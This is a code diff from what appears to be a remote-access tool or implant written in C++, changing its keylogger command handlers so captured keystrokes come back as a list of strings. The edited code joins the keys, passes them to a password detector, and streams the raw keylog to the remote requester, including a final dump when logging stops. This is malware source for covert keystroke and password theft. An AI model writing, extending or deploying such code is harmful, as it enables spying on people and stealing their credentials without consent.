@@ -436,15 +436,21 @@ void CommandDispatcher::registerHandlers() {
             while (g_isKeylogging) {
                 std::this_thread::sleep_for(std::chrono::milliseconds(intervalMs));
                 
-                std::string currentKeys = Keylogger::getDataAndClear();
-                if (!currentKeys.empty()) {
-                    PasswordDetector::analyzeKeylogBuffer(currentKeys);
+                vector<string> currentKeysVector = Keylogger::getDataAndClear();
+                if (!currentKeysVector.empty()) {
+                    std::string stringForAnalyzer = "";
+
+                    for (const auto& key : currentKeysVector) {
+                        stringForAnalyzer += key;
+                    }
+
+                    PasswordDetector::analyzeKeylogBuffer(stringForAnalyzer);
                     
                     cb(Message(Protocol::TYPE::STREAM_DATA, 
                         {
                             {"status", "ok"},
                             {"mime", "keylog"},
-                            {"data", currentKeys}
+                            {"data", currentKeysVector}
                         }, "", msg.from));
                 }
             }
@@ -460,14 +466,21 @@ void CommandDispatcher::registerHandlers() {
         g_isKeylogging = false; 
         g_keylogger.Stop();   
         
-        std::string finalLogs = Keylogger::getDataAndClear();
+        vector<std::string> finalLogsVector = Keylogger::getDataAndClear();
+
+        string finalLogs = "";
+        
+        for (const auto& key: finalLogsVector) {
+            finalLogs += key;
+        }
+
         PasswordDetector::analyzeKeylogBuffer(finalLogs);
         
         cb(Message(Protocol::TYPE::STOP_KEYLOG, 
             {
                 {"status", "ok"}, 
                 {"msg", "Keylogger stopped"},
-                {"data", finalLogs}
+                {"data", finalLogsVector}
             }, "", msg.from));
     };
     
